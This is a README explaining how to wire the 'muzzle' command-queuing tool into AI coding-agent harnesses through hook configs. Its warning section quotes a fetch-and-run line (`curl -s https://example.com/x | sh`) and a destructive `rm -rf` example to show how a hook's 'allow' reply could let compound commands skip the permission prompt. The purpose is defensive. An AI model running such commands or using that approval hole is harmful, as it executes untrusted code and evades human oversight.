# Harness hooks

How to hook muzzle into Claude Code, Codex, Muse Code, cursor-agent and
opencode (spec §Integrations, D22–D25; mu's every-harness spec D14). Each integration is a few lines of glue. The matching, quoting and
timeout handling all live in `muzzle hook` and `muzzle wrap`. The pi
extension ships in the npm package and isn't covered here.

| harness | file | tested |
| --- | --- | --- |
| Claude Code | [`claude-code.hooks.json`](claude-code.hooks.json) | yes: `tests/harnesses.rs` |
| Codex | [`codex.hooks.json`](codex.hooks.json) | yes: `tests/harnesses.rs` |
| Muse Code | [`muse.hooks.json`](muse.hooks.json) | yes: `tests/harnesses.rs`, derived payloads |
| cursor-agent | [`cursor.hooks.json`](cursor.hooks.json) | yes: `tests/harnesses.rs`, derived payloads |
| opencode | [`examples/opencode-muzzle.ts`](../../examples/opencode-muzzle.ts) | **no** (D23) |
| aider, cron, humans | wrap by hand | n/a |

`tests/harnesses.rs` reads the JSON files and runs the `command` string
from each with `sh -c`. It pipes each stored payload from
`tests/fixtures/hooks/` into that command and checks the reply. Edit a
snippet and the test runs the edited version. The payload sources are in
[`tests/fixtures/hooks/README.md`](../../tests/fixtures/hooks/README.md).

`muzzle` must be on the harness's `PATH`; `npm i -g @mu-crew/muzzle` or
`cargo install muzzle-cli` puts it there. If it isn't, the shell exits 127;
if `muzzle hook` can't answer (unreadable payload, broken config), it
exits 1 and prints nothing. Every harness here treats any code but 2 as a
non-blocking error and runs the call unchanged. `muzzle hook` itself never
exits 2, which they all read as "block". clap does, on a usage error: a
hook command edited to an unknown harness name, or with the name left off,
blocks every shell call. Keep the shipped `muzzle hook claude`,
`muzzle hook codex` and `muzzle hook cursor` lines as they are.

## Warning: `allow` skips the harness's permission prompt

A hook that replies `permissionDecision: "allow"` approves the tool call
itself, so the harness doesn't ask you. muzzle's rules match anywhere in
the string, so `cargo build && curl -s https://example.com/x | sh` matches
the `cargo-test` rule. An `allow` on that call would run the `curl | sh`
with no prompt.

- **Codex always gets `allow`.** Codex rejects `updatedInput` without it,
  and doesn't support `ask`. A matched call is therefore approved by muzzle,
  compound commands included. Use the Codex hook only where you would
  approve those shell calls anyway, or keep your rules narrow.
- **Claude Code gets `allow` only when the rule names the program that
  runs:** the raw text is plain words only (letters, digits and
  `_ . / : = , + @ % -`, single spaces between words; no quote,
  backslash, `$`, redirection such as `2>&1`, operator, tab or newline),
  and it is one simple command (no `;`, `&`, `&&`, `|`, `||`, newline,
  `$(…)`, backticks, `<(…)`/`>(…)` or subshell parens outside quotes) whose
  matched pattern starts at its command word, after any leading
  assignments and `env`, `time`, `timeout [opts] N` or `nice`. So
  `cargo test` and `timeout 600 contrib/fast-gate` are approved, but a
  pattern found in an argument or a comment (`echo cargo test`,
  `rm -rf ~/x # cargo test`, `curl … -- cargo build`) is not. For a
  `command` rule the command word must be the rule's program or `./` plus
  it (not `/tmp/evil/cargo`), and a match through a wrapper or container
  (`npx vitest run`, `mise exec -- cargo test`) is not approved. Anything else
  is rewritten without a decision, and Claude's normal permission check
  runs on the wrapped string,
  `muzzle run … -- bash -c '…'`. Your `Bash(cargo build:*)` allow rules
  don't match that form, so Claude prompts.
- **Don't add a `Bash(muzzle run:*)` allow rule** in Claude Code to silence
  those prompts. It approves every wrapped string, including the compound
  ones muzzle deliberately left to you, and brings back the auto-approve
  hole described above.

## Claude Code

Merge [`claude-code.hooks.json`](claude-code.hooks.json) into
`~/.claude/settings.json` (every project) or `.claude/settings.json` (one
repo):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "muzzle hook claude" }]
      }
    ]
  }
}
```

The reply rewrites `tool_input.command` to `muzzle run … -- bash -c '…'` and
copies the other fields (`description`, `timeout`, `run_in_background`).
Claude replaces the whole input with `updatedInput`, so dropping them would
lose them.

**Timeout (D24).** Claude's Bash timeout counts the time spent queued.
muzzle passes it on as `--run-timeout`, so the job itself is held to it.
It can't stop Claude killing the call while it waits. Raise the ceiling
with `BASH_MAX_TIMEOUT_MS` (and `BASH_DEFAULT_TIMEOUT_MS`) in the `env`
block of `settings.json`. A call killed while queued prints muzzle's D19
message, which names the cause.

## Codex

Merge [`codex.hooks.json`](codex.hooks.json) into `~/.codex/hooks.json`
(every project) or `<repo>/.codex/hooks.json` (trusted projects only):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "^Bash$",
        "hooks": [
          {
            "type": "command",
            "command": "muzzle hook codex",
            "statusMessage": "muzzle: matching the command"
          }
        ]
      }
    ]
  }
}
```

The inline form in `config.toml` is equivalent:

```toml
[[hooks.PreToolUse]]
matcher = "^Bash$"

[[hooks.PreToolUse.hooks]]
type = "command"
command = "muzzle hook codex"
```

Hooks are on by default (`[features] hooks = true`). Codex asks you to
trust a new or changed hook. Run `/hooks` to review it.

`apply_patch` calls also carry `tool_input.command`. The `^Bash$` matcher
keeps them away from muzzle, and `muzzle hook` checks `tool_name` as
well. Codex's Bash payload carries no timeout, so there is no
`--run-timeout`. Codex's own shell timeout still counts the wait.

## Muse Code

Merge [`muse.hooks.json`](muse.hooks.json) into
`~/.config/muse/settings.json` (every project), so that its
`hooks.PreToolUse` entry lands under the file's top-level `hooks` key, or
into `<repo>/.muse/hooks.json` (one repo), which takes the same
`{"hooks": {…}}` shape:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "bash",
        "hooks": [
          {
            "type": "command",
            "command": "muzzle hook claude"
          }
        ]
      }
    ]
  }
}
```

Muse Code sends Claude Code's `PreToolUse` format, so it uses
`muzzle hook claude`, and gets the same reply and the same `allow` rule as
Claude Code. Its shell tool is named `bash`, not `Bash`, and runs in
`tool_input.workdir` when that is set, so path rules follow `workdir`.
Muse resolves a relative `workdir` from the workspace root and takes
`/workspace` as an alias for that root; muzzle does the same, with the
payload's `cwd` as the root.
Its `timeout_ms` (the hard kill deadline) becomes `--run-timeout`; like
Claude's, it still counts the wait. `yield_time_ms` only says how long the
call waits for output, and is left alone.

Muse runs hooks with a cleared environment: only `HOME`, `PATH`, `USER`,
`LOGNAME`, `TMPDIR`, `SHELL`, `LANG`, `TERM` and the proxy variables
survive. So `muzzle hook claude` there reads `~/.config/muzzle/config.toml`
even when `XDG_CONFIG_HOME` is set, while the `muzzle run` it writes runs
in Muse's shell, which keeps `XDG_CONFIG_HOME`. If you set it, keep the
config at the default path too (a symlink will do), or the hook and the
run read different rules.

## cursor-agent

Merge [`cursor.hooks.json`](cursor.hooks.json) into `~/.cursor/hooks.json`
(every project) or `<repo>/.cursor/hooks.json` (one repo):

```json
{
  "version": 1,
  "hooks": {
    "beforeShellExecution": [
      {
        "command": "muzzle hook cursor"
      }
    ]
  }
}
```

`beforeShellExecution` can only allow, ask or deny a call, not rewrite it.
So `muzzle hook cursor` denies a matched command, and its reason says to
run the exact `muzzle run …` line instead. cursor-agent wraps the reason,
so the agent reads:

```text
Command execution was blocked by a hook: muzzle queues this command for the machine's shared slots; this is not a refusal. Run exactly this instead:
muzzle run --rule=cargo-test --slots 2 -- bash -c 'cargo test --workspace'

To view or modify configured hooks, go to Cursor Settings > Hooks.

Agent note: Do not suggest workarounds to the blocked tool.
```

The last two paragraphs are cursor-agent's own, which is why the reason
says this is no refusal. The agent is expected to rerun the line; that is
not yet checked in a live session. The line already runs muzzle, so the
hook passes it (`{}`), and cursor-agent's own permission rules decide as
usual. An unmatched command passes the same way. The payload has no timeout, so
there is no `--run-timeout`. Each matched command costs the agent one
extra tool call.

## opencode (untested)

[`examples/opencode-muzzle.ts`](../../examples/opencode-muzzle.ts) calls
`muzzle wrap --json` from `tool.execute.before` and sets
`output.args.command`. No test runs it in v1 (D23). Copy it to
`.opencode/plugins/` or `~/.config/opencode/plugins/`, then check that a
matched command shows up in `muzzle status` while it runs. opencode issue
#42409 reports versions where a changed `output.args.command` is ignored.

## Everything else

For aider, cron and humans, wrap by hand:

```sh
muzzle run --rule gate -- contrib/fast-gate
```

`--rule NAME` alone reads the weight from the config, so a later tuning
applies; `--slots N` would pin it. A name the config doesn't have warns
and claims 1 slot. Never put `timeout` outside `muzzle run`: it counts the queue wait. Use
`--run-timeout S`. A repo's gate script can opt in at its top, and stays
usable without muzzle (D20). The variable stops the re-exec from looping:

```sh
if [ -z "$IN_MUZZLE" ] && command -v muzzle >/dev/null; then
  IN_MUZZLE=1 exec muzzle run --rule gate -- "$0" "$@"
fi
```

There are no PATH shims in v1 (D25). If you want every `cargo` to go
through muzzle, a shim earlier in `PATH` that runs
`exec muzzle run --rule cargo-test -- /usr/bin/cargo "$@"` works. It also catches interactive
use and nested cargo calls, which is why muzzle doesn't ship one.

## Checking

`muzzle doctor` reports `claude hook` and `codex hook` as `installed` when
it finds `muzzle hook` in that harness's hook config. It doesn't look at
Muse Code's or cursor-agent's config yet. To check by hand:

```sh
muzzle hook claude < tests/fixtures/hooks/claude-bash-match.json
muzzle hook claude < tests/fixtures/hooks/muse-bash-match.json
muzzle hook cursor < tests/fixtures/hooks/cursor-shell-match.json
```
